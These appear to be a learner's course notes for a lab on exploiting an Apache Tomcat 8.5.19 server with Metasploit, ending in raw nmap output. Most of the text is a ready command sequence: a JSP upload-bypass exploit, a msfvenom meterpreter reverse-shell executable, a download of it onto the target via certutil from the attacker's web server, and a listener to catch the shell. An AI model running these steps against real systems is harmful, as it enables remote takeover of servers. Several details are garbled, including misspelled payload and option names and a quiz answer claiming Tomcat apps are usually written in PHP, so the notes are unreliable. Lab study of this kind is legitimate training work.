- AKA Tomcat Server
- Open Source Java Server
- Port 8080
- HTTP Protocol
- Used for building web applications and web sites

Setup msfconsole
```
service postgresql start
msfconsole
workspace -a Apache
workspace Apache
setg RHOSTS <target_ip>
setg RHOST <target_ip>
```

Scan and Enumerate Target
```
db_nmap -sS -sV -O <target_ip>
```

Exploit Service
```
search type:exploit name:tomcat_jsp
use exploit/multi/tomcat_jsp_upload_bypass
options

set payload java/jsp_shell_bing_tcp
set SHELL CMD
exploit
Crtl-Z
exit
```

Create payload with msfvenom
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local_ip> LPORT=<local_port> -f exe > meterpreter.exe
```

Setup web server to host payload
```
sudo python3 -m SimpleHTTPServer 80
```

Within the target session, download file from remote server
```
certutil -urlcache -f http://<local_ip>/meterpreter.exe meterepreter.exe 
```

Setup 
```
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOSTS <local_ip>
set LPORT <local_port>
exploit
```

## Quiz

What is the default port used by Apache Tomcat?

	8080


Apache Tomcat can be used to host web applications developed in Java?

	FALSE -> Usually written in PHP
## Lab


A Kali GUI machine and a target machine running a vulnerable java web server are provided to you. The IP address of the target machine is provided in a text file named target placed on the Desktop of the Kali machine (/root/Desktop/target).  

Your task is to fingerprint the application using the tools available on the Kali machine and then exploit the application using the appropriate Metasploit module.

**Objective:** Exploit the application and retrieve the flag!

Instructions:* Your Kali machine has an interface with IP address 10.10.X.Y. Run “ip addr” to know the values of X and Y. * The IP address of the target machine is mentioned in the file “/root/Desktop/target” * Do not attack the gateway located at IP address 192.V.W.1 and 10.10.X.1

```
db_nmap -sS -sV -O 10.4.26.6

8080/tcp  open  http               Apache Tomcat 8.5.19
```

```
use exploit/multi/http/tomcat_jsp_upload_bypass

```



```
nmap -p 8080 -A demo.ine.local                                                   

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat 8.5.19
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/8.5.19
|_http-favicon: Apache Tomcat
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows 8.1 (97%), Microsoft Windows Server 2012 (96%), Microsoft Windows Server 2012 R2 (96%), Microsoft Windows Server 2012 R2 Update 1 (96%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (96%), Microsoft Windows Vista SP1 (96%), Microsoft Windows Server 2012 or Server 2012 R2 (95%), Microsoft Windows Server 2008 SP2 Datacenter Version (94%), Microsoft Windows 7 or Windows Server 2008 R2 (94%), Microsoft Windows Server 2008 R2 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops

TRACEROUTE (using port 8080/tcp)
HOP RTT     ADDRESS
1   0.03 ms us-east-9 (10.10.42.1)
2   ...
3   9.09 ms demo.ine.local (10.4.16.52)

``